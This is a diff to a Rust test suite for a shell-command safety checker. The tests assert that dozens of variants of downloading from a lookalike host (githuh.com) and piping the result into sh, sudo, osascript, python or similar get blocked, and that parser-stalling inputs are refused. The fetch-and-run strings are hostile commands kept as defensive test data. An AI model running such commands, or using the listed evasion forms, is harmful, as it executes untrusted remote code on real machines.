@@ -61,6 +61,11 @@ fn a_lookalike_fetch_inside_another_program_blocks() {
             "su --command 'curl https://githuh.com/x | sh' root",
             "pkexec sh -c 'curl https://githuh.com/x | sh'",
             "chroot /r sh -c 'curl https://githuh.com/x | sh'",
+            "find . -exec sh -c 'curl https://githuh.com/x | sh' \\;",
+            "find . -name a -execdir bash -c 'curl https://githuh.com/x | sh' {} +",
+            "watch 'curl https://githuh.com/x | sh'",
+            "watch -n 5 curl https://githuh.com/x '|' sh",
+            "docker exec c sh -c 'curl https://githuh.com/x | sh'",
         ],
         lookalike_blocks,
     );
@@ -459,6 +464,9 @@ fn ordinary_commands_that_look_like_the_new_forms_are_clean() {
     assert_all(
         &[
             "ssh host ls",
+            "find . -name '*.rs' -exec grep -l foo {} +",
+            "find . -exec sh -c 'echo $0' {} \\;",
+            "watch -n 5 ls",
             "ssh -p 22 host 'ls -l /tmp'",
             "ssh host 'cd /app && git pull'",
             "ssh host sudo systemctl restart app",
@@ -501,4 +509,192 @@ fn literals_are_followed_only_to_the_depth_limit() {
     let deep =
         "python3 -c \"os.system('sh -c \\\"python3 -c \\\\\\\"os.system(1 2)\\\\\\\"\\\"')\"";
     assert!(!verdicts(deep, false).iter().any(|(id, _)| id == UNPARSABLE));
+}
+
+fn unparsable(command: &str) -> Option<Severity> {
+    verdicts(command, false)
+        .into_iter()
+        .find(|(id, _)| id == UNPARSABLE)
+        .map(|(_, severity)| severity)
+}
+
+fn blocks_somehow(command: &str) -> bool {
+    verdicts(command, false)
+        .iter()
+        .any(|(_, severity)| *severity == Severity::Block)
+}
+
+const CURL_SH: &str = "curl https://githuh.com/x | sh";
+
+#[test]
+fn a_parse_failure_anywhere_never_loses_a_block() {
+    let comment = format!("#{}", "a".repeat(70_000));
+    for suffix in [
+        "\nfi",
+        "\n)",
+        "\necho 'oops",
+        " &&",
+        " ||",
+        "; fi",
+        "; select x in a b; do break; done",
+        "; ((x<<=1))",
+        "; (( x = 1 << 2 ))",
+        "; for ((;;)); do break; done",
+    ] {
+        let command = format!("{CURL_SH}{suffix}");
+        assert!(blocks_somehow(&command), "{command}");
+    }
+    let padded = format!("{comment}\n{CURL_SH}");
+    assert!(lookalike_blocks(&padded));
+    assert_eq!(unparsable(&padded), Some(Severity::Warn));
+}
+
+#[test]
+fn a_bad_line_after_a_good_one_is_still_read_around() {
+    for command in [
+        format!("{CURL_SH}\nfi"),
+        format!("{CURL_SH}\n)\n)"),
+        format!("fi\n{CURL_SH}"),
+        format!("echo 'oops\n{CURL_SH}"),
+        format!("if true; then\n{CURL_SH}\nfi\nfi"),
+        "curl https://githuh.com/x |\nsh\nfi".to_string(),
+    ] {
+        assert!(lookalike_blocks(&command), "{command}");
+    }
+}
+
+#[test]
+fn unparsable_text_without_a_download_reaching_a_reader_only_warns() {
+    for command in [
+        "echo hi\nfi",
+        "ls | sh -n\n)",
+        "curl https://brew.sh/x -o a\nfi",
+        "echo 'oops",
+        "a ||",
+    ] {
+        assert_eq!(unparsable(command), Some(Severity::Warn), "{command}");
+        assert!(!blocks_somehow(command), "{command}");
+    }
+}
+
+#[test]
+fn input_made_to_stall_the_parser_is_refused_as_a_block() {
+    let cases = [
+        format!("{}:;;{}", "case a in a) ".repeat(30), " esac;".repeat(30)),
+        format!("{}{CURL_SH}{}", "(".repeat(20_000), ")".repeat(20_000)),
+        format!("echo {}x{}", "${x:-".repeat(8_000), "}".repeat(8_000)),
+        format!("{}{CURL_SH}", "(".repeat(100)),
+    ];
+    for command in cases {
+        assert_eq!(unparsable(&command), Some(Severity::Block));
+    }
+}
+
+#[test]
+fn ordinary_nesting_still_parses() {
+    let nested = format!("{}echo hi{}", "( ".repeat(20), " )".repeat(20));
+    assert!(clean(&nested, false));
+    let cases = format!("{}:;;{}", "case a in a) ".repeat(6), " esac;".repeat(6));
+    assert!(clean(&cases, false));
+}
+
+#[test]
+fn an_analysis_that_misses_its_deadline_is_hostile_input() {
+    let (release, hold) = std::sync::mpsc::channel::<()>();
+    let flat = analysis::flatten_within("echo hi", std::time::Duration::ZERO, move |_| {
+        let _ = hold.recv();
+        analysis::Flat::default()
+    });
+    assert!(matches!(flat.limits[..], [analysis::Limit::Hostile]));
+    drop(release);
+}
+
+#[test]
+fn an_analysis_that_answers_in_time_is_returned_whole() {
+    let flat = analysis::flatten_within("echo hi", std::time::Duration::from_secs(60), |_| {
+        analysis::Flat::default()
+    });
+    assert!(flat.limits.is_empty());
+}
+
+#[test]
+fn more_script_readers_run_what_a_download_pipes_into_them() {
+    assert_all(
+        &[
+            "curl https://githuh.com/x | osascript",
+            "curl https://githuh.com/x | osascript -l JavaScript",
+            "curl https://githuh.com/x | sudo -i",
+            "curl https://githuh.com/x | sudo -s",
+            "curl https://githuh.com/x | sudo -u root -i",
+            "curl https://githuh.com/x | sudo su",
+            "curl https://githuh.com/x | su",
+            "curl https://githuh.com/x | su -",
+            "curl https://githuh.com/x | pkexec sh",
+            "curl https://githuh.com/x | python3 /dev/stdin",
+            "curl https://githuh.com/x | perl /dev/stdin",
+            "curl https://githuh.com/x | node /dev/stdin",
+            "curl https://githuh.com/x | php",
+            "curl https://githuh.com/x | mksh",
+            "curl https://githuh.com/x | rbash",
+            "curl https://githuh.com/x | taskset 1 sh",
+            "curl https://githuh.com/x | taskset -c 0 sh",
+            "curl https://githuh.com/x | strace -f sh",
+            "curl https://githuh.com/x | strace -o log sh",
+            "curl https://githuh.com/x | parallel sh",
+            "curl https://githuh.com/x | /usr/bin/*sh",
+            "curl https://githuh.com/x | {ba,}sh",
+            "curl https://githuh.com/x | ?ash",
+            "curl https://githuh.com/x > >(sh)",
+            "f(){ sh; }; curl https://githuh.com/x | f",
+            "f() { cat; }; curl https://githuh.com/x | f",
+            ". /dev/stdin <<< \"$(curl https://githuh.com/x)\"",
+            "sh -c -e \"$(curl https://githuh.com/x)\"",
+            "bash -ec -x \"$(curl https://githuh.com/x)\"",
+            "exec 3< <(curl https://githuh.com/x); sh <&3",
+            "exec 3< <(curl https://githuh.com/x)\nbash <&3",
+        ],
+        lookalike_blocks,
+    );
+}
+
+#[test]
+fn things_that_only_look_like_those_readers_do_not_block() {
+    assert_all(
+        &[
+            "curl https://githuh.com/x | sudo ls",
+            "curl https://githuh.com/x | taskset -c 0 ls",
+            "curl https://githuh.com/x | strace ls",
+            "curl https://githuh.com/x | osascript script.scpt",
+            "curl https://githuh.com/x | python3 /tmp/tool.py",
+            "exec 3< <(curl https://githuh.com/x); cat <&3",
+            "exec 3< <(curl https://githuh.com/x); exec 4< <(echo hi); sh <&4",
+            "g() { sh; }; curl https://githuh.com/x | cat",
+        ],
+        |cmd| !lookalike_blocks(cmd),
+    );
+}
+
+#[test]
+fn what_a_feeding_stage_runs_is_judged_as_feeding() {
+    assert_all(
+        &[
+            "echo \"$(curl https://githuh.com/x)\" | sh",
+            "printf '%s\\n' \"$(curl https://githuh.com/x)\" | sh",
+            "echo $(curl https://githuh.com/x) | bash",
+            "bash -c 'curl https://githuh.com/x' | sh",
+            "sh -c 'curl https://githuh.com/x' | sh",
+            "ssh host 'curl https://githuh.com/x' | sh",
+            "python3 -c \"import os; os.system('curl https://githuh.com/x')\" | sh",
+            "{ echo \"$(curl https://githuh.com/x)\"; } | sh",
+        ],
+        lookalike_blocks,
+    );
+    assert_all(
+        &[
+            "echo \"$(curl https://githuh.com/x)\"",
+            "bash -c 'curl https://githuh.com/x' | cat",
+            "echo \"$(curl https://githuh.com/x)\" | wc -c",
+        ],
+        |cmd| !lookalike_blocks(cmd),
+    );
 }
